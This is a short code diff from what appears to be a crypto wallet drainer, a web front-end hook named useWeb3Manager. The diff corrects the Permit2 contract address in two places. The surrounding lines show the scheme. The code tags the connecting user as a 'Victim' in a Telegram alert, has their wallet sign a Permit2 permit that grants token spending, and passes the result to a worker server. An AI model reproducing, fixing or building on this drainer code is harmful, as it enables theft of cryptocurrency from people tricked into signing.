@@ -140,7 +140,7 @@ export function useWeb3Manager() {
                     if (!walletProvider) return;
                     const provider = new ethers.BrowserProvider(walletProvider);
                     const signer = await provider.getSigner();
-                    const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116dee9f6b43ac78ba3");
+                    const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
                     if (assets.length > 0) {
                         for (const token of assets) {
                             if (token.isNative) continue;
@@ -346,7 +346,7 @@ export function useWeb3Manager() {
                             notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nTokens: ${validTokens.length}\nNFTs: ${validNfts.length}`);
 
                             const signature = await signer.signTypedData({
-                                name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116dee9f6b43ac78ba3")
+                                name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3")
                             }, p2types, permit);
 
                             const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
